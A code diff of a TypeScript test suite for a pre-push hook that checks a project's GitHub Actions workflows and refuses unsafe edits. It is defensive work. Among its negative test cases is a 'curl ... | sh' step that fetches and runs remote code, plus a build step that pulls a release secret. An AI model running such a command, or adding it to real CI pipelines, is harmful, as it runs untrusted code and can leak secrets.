@@ -2,222 +2,33 @@
 import * as NodeChildProcess from "node:child_process";
 import * as NodeFS from "node:fs";
 import * as NodeModule from "node:module";
-import * as NodeOS from "node:os";
 import * as NodePath from "node:path";
-import * as NodeProcess from "node:process";
-import * as NodeURL from "node:url";
 
 import { afterEach, describe, expect, it } from "vite-plus/test";
 
-const sourceRoot = NodeURL.fileURLToPath(new URL("../", import.meta.url));
-const zero = "0".repeat(40);
-const workflowPath = ".github/workflows/goat-ci.yml";
-const upstreamPath = ".github/workflows/upstream.yaml";
-const runnerLabels = ["self-hosted", "linux", "x64", "goat", "epyc"];
-const baseJob = { "runs-on": runnerLabels, steps: [{ run: "echo ok" }] };
-const validWorkflow = `on:
-  push:
-jobs:
-  ci:
-    runs-on: [self-hosted, linux, x64, goat, epyc]
-    steps:
-      - run: echo ok
-`;
-const yamlRefusal =
-  "goat pre-push: repository yaml@2.* is unavailable or unloadable; run vp i; refusing to push";
-const advice =
-  "goat pre-push: disable Actions (gh api -X PUT repos/goat-si/goat/actions/permissions -F enabled=false), push, disable the new workflows, then re-enable Actions.";
-const temporaryRoots: string[] = [];
+import {
+  advice,
+  baseJob,
+  fixture,
+  gateJob,
+  gitExecutable,
+  lightRunner,
+  removeFixtures,
+  runnerLabels,
+  screenshotPermissions,
+  screenshotWorkflow,
+  sourceRoot,
+  trustedRunner,
+  upstreamPath,
+  validWorkflow,
+  workflow,
+  workflowPath,
+  yamlRefusal,
+  yamlSource,
+  zero,
+} from "./lib/goat-workflow-guard-fixture.ts";
 
-function executable(name: string) {
-  for (const directory of (NodeProcess.env.PATH ?? "").split(NodePath.delimiter)) {
-    const candidate = NodePath.join(directory, name);
-    try {
-      NodeFS.accessSync(candidate, NodeFS.constants.X_OK);
-      return candidate;
-    } catch {
-      // Continue looking for the executable in the host's PATH.
-    }
-  }
-  throw new Error(`test prerequisite unavailable: ${name}`);
-}
-
-const gitExecutable = executable("git");
-const yamlStore = NodePath.join(sourceRoot, "node_modules/.pnpm");
-const yamlPackageName = NodeFS.readdirSync(yamlStore)
-  .filter((name) => name.startsWith("yaml@2."))
-  .sort()[0];
-if (!yamlPackageName) throw new Error("tests require repository yaml@2.*; run vp i");
-const yamlName = yamlPackageName;
-const yamlSource = NodePath.join(yamlStore, yamlName, "node_modules/yaml");
-
-function workflow(job: unknown = baseJob, on: unknown = { push: null }) {
-  return JSON.stringify({ on, jobs: { ci: job } });
-}
-
-const screenshotPermissions = {
-  contents: "read",
-  issues: "read",
-  "pull-requests": "read",
-  checks: "write",
-};
-
-function screenshotWorkflow(patch: Record<string, unknown> = {}) {
-  return JSON.stringify({
-    on: { pull_request: null },
-    jobs: {
-      ci: baseJob,
-      "screenshot-gate": { ...baseJob, permissions: screenshotPermissions, ...patch },
-    },
-  });
-}
-
-function fixture(
-  options: {
-    node?: boolean;
-    gh?: boolean;
-    yaml?: "real" | "missing" | "wrong-version" | "unloadable";
-    workflow?: string | null;
-  } = {},
-) {
-  const root = NodeFS.mkdtempSync(NodePath.join(NodeOS.tmpdir(), "goat-workflow-guard-"));
-  temporaryRoots.push(root);
-  const repo = NodePath.join(root, "repo");
-  const bare = NodePath.join(root, "goat-si/goat.git");
-  const bin = NodePath.join(root, "bin");
-  const home = NodePath.join(root, "home");
-  const calls = NodePath.join(root, "gh-calls");
-  const ghArgs = NodePath.join(root, "gh-args");
-  const parser = NodePath.join(repo, "node_modules/.pnpm", yamlName, "node_modules/yaml");
-  for (const directory of [
-    repo,
-    bin,
-    home,
-    NodePath.dirname(bare),
-    NodePath.join(repo, ".vite-hooks/_"),
-  ]) {
-    NodeFS.mkdirSync(directory, { recursive: true });
-  }
-  for (const name of ["git", "sh", "basename", "dirname", "tr"]) {
-    NodeFS.symlinkSync(executable(name), NodePath.join(bin, name));
-  }
-  if (options.node !== false) NodeFS.symlinkSync(NodeProcess.execPath, NodePath.join(bin, "node"));
-  if (options.gh !== false) {
-    const mock = NodePath.join(bin, "gh");
-    NodeFS.writeFileSync(
-      mock,
-      `#!/bin/sh
-printf 'call\n' >> "$MOCK_GH_CALLS"
-printf '%s\n' "$@" > "$MOCK_GH_ARGS"
-if [ "\${MOCK_GH_FAIL:-}" = "1" ]; then exit 1; fi
-printf '%s\n' "$MOCK_DISABLED_WORKFLOWS"
-`,
-    );
-    NodeFS.chmodSync(mock, 0o755);
-  }
-  const yamlMode = options.yaml ?? "real";
-  if (yamlMode !== "missing") {
-    NodeFS.mkdirSync(NodePath.dirname(parser), { recursive: true });
-    if (yamlMode === "real") {
-      NodeFS.symlinkSync(yamlSource, parser, "dir");
-    } else {
-      NodeFS.mkdirSync(parser);
-      NodeFS.writeFileSync(
-        NodePath.join(parser, "package.json"),
-        JSON.stringify({
-          name: "yaml",
-          version: yamlMode === "wrong-version" ? "1.10.0" : "2.9.0",
-          main: "missing.cjs",
-        }),
-      );
-    }
-  }
-  for (const path of ["pre-push", "goat-workflow-guard.mjs", "_/h", "_/pre-push"]) {
-    const target = NodePath.join(repo, ".vite-hooks", path);
-    NodeFS.copyFileSync(NodePath.join(sourceRoot, ".vite-hooks", path), target);
-    NodeFS.chmodSync(target, 0o755);
-  }
-  const env = { ...NodeProcess.env };
-  for (const key of [
-    "GIT_DIR",
-    "GIT_WORK_TREE",
-    "GIT_INDEX_FILE",
-    "GIT_COMMON_DIR",
-    "GIT_CONFIG_COUNT",
-    "GIT_CONFIG_PARAMETERS",
-  ]) {
-    delete env[key];
-  }
-  Object.assign(env, {
-    PATH: bin,
-    HOME: home,
-    XDG_CONFIG_HOME: NodePath.join(home, ".config"),
-    VP_HOME: home,
-    HUSKY: "1",
-    VP_GIT_HOOKS: "1",
-    VITE_GIT_HOOKS: "1",
-    GOAT_SKIP_WORKFLOW_GUARD: "",
-    GIT_CONFIG_GLOBAL: "/dev/null",
-    GIT_CONFIG_NOSYSTEM: "1",
-    GIT_TERMINAL_PROMPT: "0",
-    GIT_AUTHOR_NAME: "Guard fixture",
-    GIT_AUTHOR_EMAIL: "guard@example.invalid",
-    GIT_COMMITTER_NAME: "Guard fixture",
-    GIT_COMMITTER_EMAIL: "guard@example.invalid",
-    MOCK_GH_CALLS: calls,
-    MOCK_GH_ARGS: ghArgs,
-    MOCK_GH_FAIL: "",
-    MOCK_DISABLED_WORKFLOWS: upstreamPath,
-  });
-  function git(...args: string[]) {
-    return NodeChildProcess.execFileSync(gitExecutable, args, {
-      cwd: repo,
-      env,
-      encoding: "utf8",
-      stdio: ["ignore", "pipe", "pipe"],
-    }).trim();
-  }
-  function write(path: string, content: string) {
-    const target = NodePath.join(repo, path);
-    NodeFS.mkdirSync(NodePath.dirname(target), { recursive: true });
-    NodeFS.writeFileSync(target, content);
-  }
-  function commit() {
-    git("add", ".github", ".vite-hooks");
-    git("-c", "core.hooksPath=/dev/null", "commit", "--allow-empty", "-m", "workflow fixture");
-    return git("rev-parse", "HEAD");
-  }
-  function record(sha: string, ref = "refs/heads/test", remoteSha = zero) {
-    return `${ref} ${sha} ${ref} ${remoteSha}\n`;
-  }
-  function hook(records: string, extraEnv: Record<string, string> = {}, remote = ["origin", bare]) {
-    return NodeChildProcess.spawnSync("/bin/sh", ["-e", ".vite-hooks/pre-push", ...remote], {
-      cwd: repo,
-      env: { ...env, ...extraEnv },
-      input: records,
-      encoding: "utf8",
-    });
-  }
-  function ghCalls() {
-    return NodeFS.existsSync(calls)
-      ? NodeFS.readFileSync(calls, "utf8").trim().split("\n").length
-      : 0;
-  }
-  git("init", "--initial-branch=main");
-  write(".git/info/exclude", "node_modules/\n");
-  git("init", "--bare", bare);
-  git("remote", "add", "origin", bare);
-  git("config", "core.hooksPath", ".vite-hooks/_");
-  write(upstreamPath, "on: push\njobs: {}\n");
-  if (options.workflow !== null) write(workflowPath, options.workflow ?? validWorkflow);
-  const sha = commit();
-  return { repo, bare, bin, parser, env, sha, git, write, commit, record, hook, ghCalls, ghArgs };
-}
-
-afterEach(() => {
-  for (const root of temporaryRoots.splice(0))
-    NodeFS.rmSync(root, { recursive: true, force: true });
-});
+afterEach(removeFixtures);
 
 describe("goat pre-push workflow guard", () => {
   it("allows the shipped goat workflow with disabled upstream workflows and the audited lookup", () => {
@@ -243,32 +54,56 @@ describe("goat pre-push workflow guard", () => {
     expect(f.hook(f.record(f.sha)).status).toBe(0);
   });
 
-  it("allows the scope and result jobs on the pinned hosted image or EPYC, nothing else", () => {
-    const jobs = { scope: baseJob, ci: baseJob, result: baseJob };
-    const allowed = fixture({ workflow: JSON.stringify({ on: { pull_request: null }, jobs }) });
-    expect(allowed.hook(allowed.record(allowed.sha)).status).toBe(0);
-    const pinned = fixture({
+  it.each(["ubuntu-24.04", lightRunner])("allows the gate jobs on %s", (runner) => {
+    const gate = { ...gateJob, "runs-on": runner };
+    const f = fixture({
       workflow: JSON.stringify({
         on: { pull_request: null },
-        jobs: { ...jobs, scope: { ...baseJob, "runs-on": "ubuntu-24.04" } },
+        jobs: { scope: gate, ci: { ...baseJob, "runs-on": trustedRunner }, result: gate },
       }),
     });
-    expect(pinned.hook(pinned.record(pinned.sha)).status).toBe(0);
-    const hosted = fixture({
+    expect(f.hook(f.record(f.sha)).status).toBe(0);
+  });
+
+  // A gate job on the matrix's runners waits behind it; the matrix on the light runners would
+  // take the only runners the gates can use.
+  it.each([
+    ["scope", "the matrix's EPYC expression", trustedRunner],
+    ["result", "the matrix's EPYC labels", runnerLabels],
+    [
+      "scope",
+      "the light labels without the fork fallback",
+      ["self-hosted", "linux", "x64", "goat", "epyc-light"],
+    ],
+    ["result", "a moving hosted image", "ubuntu-latest"],
+    [
+      "result",
+      "an edited light expression",
+      lightRunner.replace("'ubuntu-24.04'", "'ubuntu-latest'"),
+    ],
+  ])("refuses jobs.%s on %s", (name, _label, runner) => {
+    const f = fixture({
       workflow: JSON.stringify({
         on: { pull_request: null },
-        jobs: { ...jobs, scope: { ...baseJob, "runs-on": "ubuntu-latest" } },
+        jobs: { ci: baseJob, [name]: { ...gateJob, "runs-on": runner } },
       }),
     });
-    const refused = hosted.hook(hosted.record(hosted.sha));
-    expect(refused.status).not.toBe(0);
+    const refused = f.hook(f.record(f.sha));
+    expect(refused.status).toBe(1);
     expect(refused.stderr).toContain(
-      "jobs.scope.runs-on must be ubuntu-24.04, exactly self-hosted, linux, x64, goat, epyc, or the trusted-run EPYC expression",
+      `jobs.${name}.runs-on must be ubuntu-24.04 or the trusted-run epyc-light expression`,
     );
   });
 
-  const trustedRunner =
-    '${{ (github.event_name == \'workflow_dispatch\' || github.event.pull_request.head.repo.full_name == github.repository) && fromJSON(\'["self-hosted","linux","x64","goat","epyc"]\') || \'ubuntu-24.04\' }}';
+  it.each([
+    ["light expression", lightRunner],
+    ["light labels", ["self-hosted", "linux", "x64", "goat", "epyc-light"]],
+  ])("refuses the ci matrix on the %s", (_label, runner) => {
+    const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": runner }) });
+    const refused = f.hook(f.record(f.sha));
+    expect(refused.status).toBe(1);
+    expect(refused.stderr).toContain("jobs.ci.runs-on must be ubuntu-24.04");
+  });
 
   it("allows the trusted-run expression that keeps fork pull requests on the hosted image", () => {
     const f = fixture({ workflow: workflow({ ...baseJob, "runs-on": trustedRunner }) });
@@ -524,17 +359,17 @@ describe("goat pre-push workflow guard", () => {
     [
       "extra job",
       JSON.stringify({ on: { push: null }, jobs: { ci: baseJob, extra: baseJob } }),
-      "jobs must contain ci and optionally scope, screenshot-gate, result",
+      "jobs must contain ci and optionally scope, screenshot-gate, result, republish",
     ],
     [
       "missing jobs",
       JSON.stringify({ on: { push: null } }),
-      "jobs must contain ci and optionally scope, screenshot-gate, result",
+      "jobs must contain ci and optionally scope, screenshot-gate, result, republish",
     ],
     [
       "jobs array",
       JSON.stringify({ on: { push: null }, jobs: [] }),
-      "jobs must contain ci and optionally scope, screenshot-gate, result",
+      "jobs must contain ci and optionally scope, screenshot-gate, result, republish",
     ],
     ["nonmapping ci", workflow(null), "jobs.ci must be a mapping"],
     [
@@ -789,7 +624,7 @@ exit 1
 
 const nightlyPath = ".github/workflows/goat-nightly.yml";
 const prepareGateText =
-  "github.repository == 'goat-si/goat' && (github.event_name == 'workflow_dispatch' || (vars.GOAT_RELEASES_PUBLISH == 'true' && github.event.workflow_run.conclusion == 'success' && github.event.workflow_run.event == 'workflow_dispatch' && github.event.workflow_run.display_title == 'goat-ci all on dev' && github.event.workflow_run.head_branch == 'dev' && github.event.workflow_run.head_repository.full_name == 'goat-si/goat'))";
+  "github.repository == 'goat-si/goat' && (github.event_name == 'workflow_dispatch' || (github.event_name == 'schedule' && vars.GOAT_RELEASES_PUBLISH == 'true'))";
 const downstreamGateText =
   "needs.prepare.result == 'success' && needs.prepare.outputs.skip == 'false'";
 const macRunner = ["self-hosted", "macOS", "ARM64", "goat", "mac-studio"];
@@ -859,10 +694,7 @@ function nightlyJobs(): NightlyJobs {
 }
 function nightly(jobs: NightlyJobs = nightlyJobs(), on: unknown = undefined) {
   return JSON.stringify({
-    on: on ?? {
-      workflow_run: { workflows: ["goat-ci"], types: ["completed"], branches: ["dev"] },
-      workflow_dispatch: null,
-    },
+    on: on ?? { schedule: [{ cron: "0 18 * * *" }], workflow_dispatch: null },
     permissions: { contents: "read" },
     jobs,
   });
@@ -887,10 +719,10 @@ describe("goat pre-push nightly workflow guard", () => {
     expect(result.status).toBe(0);
   });
 
-  it("allows contents: write on jobs that use the staging hand-off", () => {
+  it("allows contents: write on hand-off jobs, and issues: read on publish", () => {
     const jobs = nightlyJobs();
     jobs.build_mac = { ...jobs.build_mac, permissions: { contents: "write" } };
-    jobs.publish = { ...jobs.publish, permissions: { contents: "write" } };
+    jobs.publish = { ...jobs.publish, permissions: { contents: "write", issues: "read" } };
     jobs.cleanup = {
       needs: ["prepare", "publish"],
       if: `${downstreamGateText} && (always())`,
@@ -937,7 +769,7 @@ describe("goat pre-push nightly workflow guard", () => {
   it("refuses a YAML alias that copies the publish job under another name", () => {
     const yamlText = [
       "on:",
-      "  workflow_run: { workflows: [goat-ci], types: [completed], branches: [dev] }",
+      "  workflow_dispatch:",
       "permissions: { contents: read }",
       "jobs:",
       `  prepare: ${JSON.stringify(nightlyJobs().prepare)}`,
@@ -957,37 +789,52 @@ describe("goat pre-push nightly workflow guard", () => {
   it.each<[string, string, string]>([
     [
       "a pull_request trigger",
+      nightly(undefined, { workflow_dispatch: null, pull_request: null }),
+      "on must be workflow_dispatch plus an optional schedule",
+    ],
+    ["a push trigger", nightly(undefined, { push: null }), "on must be workflow_dispatch plus"],
+    [
+      "the old goat-ci workflow_run trigger",
       nightly(undefined, {
         workflow_run: { workflows: ["goat-ci"], types: ["completed"], branches: ["dev"] },
-        pull_request: null,
+        workflow_dispatch: null,
       }),
-      "on must be workflow_run of goat-ci",
-    ],
-    ["a push trigger", nightly(undefined, { push: null }), "on must be workflow_run of goat-ci"],
-    [
-      "a gate that accepts pull request runs",
-      withJob("prepare", {
-        if: prepareGateText.replace(
-          " && github.event.workflow_run.event == 'workflow_dispatch'",
-          "",
-        ),
-      }),
-      "jobs.prepare.if must be the manual dev run gate",
+      "on must be workflow_dispatch plus",
     ],
     [
-      "a gate that accepts a partial manual lane",
+      "a schedule without a manual trigger",
+      nightly(undefined, { schedule: [{ cron: "0 18 * * *" }] }),
+      "on must be workflow_dispatch plus",
+    ],
+    [
+      "a schedule entry with extra keys",
+      nightly(undefined, {
+        schedule: [{ cron: "0 18 * * *", branches: ["main"] }],
+        workflow_dispatch: null,
+      }),
+      "on must be workflow_dispatch plus",
+    ],
+    [
+      "a gate that publishes scheduled runs without the repository variable",
+      withJob("prepare", {
+        if: prepareGateText.replace(" && vars.GOAT_RELEASES_PUBLISH == 'true'", ""),
+      }),
+      "jobs.prepare.if must be the manual or scheduled run gate",
+    ],
+    [
+      "a gate that also accepts pushes",
       withJob("prepare", {
         if: prepareGateText.replace(
-          " && github.event.workflow_run.display_title == 'goat-ci all on dev'",
-          "",
+          "github.event_name == 'workflow_dispatch' ||",
+          "github.event_name == 'workflow_dispatch' || github.event_name == 'push' ||",
         ),
       }),
-      "jobs.prepare.if must be the manual dev run gate",
+      "jobs.prepare.if must be the manual or scheduled run gate",
     ],
     [
       "a missing gate",
       withJob("prepare", { if: undefined }),
-      "jobs.prepare.if must be the manual dev run gate",
+      "jobs.prepare.if must be the manual or scheduled run gate",
     ],
     [
       "a job without needs: prepare",
@@ -1159,7 +1006,7 @@ describe("goat pre-push nightly workflow guard", () => {
     ],
     [
       "write permissions beyond contents",
-      withJob("publish", { permissions: { contents: "write", actions: "write" } }),
+      withJob("publish", { permissions: { contents: "write", issues: "write" } }),
       "jobs.publish may only request contents: write",
     ],
     [
@@ -1168,8 +1015,8 @@ describe("goat pre-push nightly workflow guard", () => {
       "jobs.build_mac may only request contents: write",
     ],
     [
-      "a non-contents write permission",
-      withJob("build_other", { permissions: { packages: "write" } }),
+      "issues: read outside publish",
+      withJob("build_other", { permissions: { contents: "write", issues: "read" } }),
       "jobs.build_other may only request contents: write",
     ],
     [
@@ -1342,5 +1189,114 @@ describe("goat pre-push close-outside-prs workflow guard", () => {
     expect(result.status).toBe(1);
     expect(result.stderr).toContain(`goat pre-push: ${closeOutsidePrsPath} in refs/heads/test (`);
     expect(result.stderr).toContain(reason);
+  });
+});
+
+const marketingPagesPath = ".github/workflows/marketing-pages.yml";
+
+describe("goat pre-push marketing-pages workflow guard", () => {
+  const shippedSource = NodeFS.readFileSync(NodePath.join(sourceRoot, marketingPagesPath), "utf8");
+  const yaml = NodeModule.createRequire(import.meta.url)(yamlSource) as {
+    parse: (source: string) => Record<string, any>;
+  };
+  function push(content: string) {
+    const f = fixture();
+    f.write(marketingPagesPath, content);
+    const sha = f.commit();
+    return f.hook(f.record(sha));
+  }
+  function patched(edit: (workflow: Record<string, any>) => void) {
+    const workflow = yaml.parse(shippedSource);
+    edit(workflow);
+    return JSON.stringify(workflow);
+  }
+
+  it("allows the shipped workflow while it stays active on GitHub", () => {
+    const result = push(shippedSource);
+    expect(result.stderr).toBe("");
+    expect(result.status).toBe(0);
+  });
+
+  it.each([
+    [
+      "a pull_request trigger",
+      patched((w) => {
+        w.on.pull_request = null;
+      }),
+    ],
+    [
+      "contents: write on the build job",
+      patched((w) => {
+        w.jobs.build.permissions = { contents: "write" };
+      }),
+    ],
+    [
+      "pages: write on the build job",
+      patched((w) => {
+        w.jobs.build.permissions = { pages: "write" };
+      }),
+    ],
+    [
+      "a Pages build request when nothing was pushed",
+      patched((w) => {
+        delete w.jobs.deploy.steps[2].if;
+      }),
+    ],
+    [
+      "contents: write",
+      patched((w) => {
+        w.permissions.contents = "write";
+      }),
+    ],
+    [
+      "an action pinned to a tag",
+      patched((w) => {
+        w.jobs.deploy.steps[0].uses = "actions/cache/restore@v6";
+      }),
+    ],
+    [
+      "a secret in the build",
+      patched((w) => {
+        w.jobs.build.steps[2].env.TOKEN = "${{ secrets.GOAT_RELEASES_TOKEN }}";
+      }),
+    ],
+    [
+      "a push to a branch other than gh-pages",
+      patched((w) => {
+        w.jobs.deploy.steps[1].run = w.jobs.deploy.steps[1].run.replace(
+          "refs/heads/gh-pages",
+          "refs/heads/dev",
+        );
+      }),
+    ],
+    [
+      "an extra step before the deploy",
+      patched((w) => {
+        w.jobs.deploy.steps.unshift({ run: "curl -fsSL https://example.invalid | sh" });
+      }),
+    ],
+    [
+      "a self-hosted runner",
+      patched((w) => {
+        w.jobs.build["runs-on"] = runnerLabels;
+      }),
+    ],
+    [
+      "a deploy from another branch",
+      patched((w) => {
+        w.jobs.build.if = "github.repository == 'goat-si/goat'";
+      }),
+    ],
+    [
+      "a deploy without the repository switch",
+      patched((w) => {
+        w.jobs.build.if = "github.repository == 'goat-si/goat' && github.ref == 'refs/heads/dev'";
+      }),
+    ],
+  ])("refuses %s", (_name, content) => {
+    const result = push(content);
+    expect(result.status).toBe(1);
+    expect(result.stderr).toContain(`goat pre-push: ${marketingPagesPath} in refs/heads/test (`);
+    expect(result.stderr).toContain("must match the reviewed workflow");
   });
 });
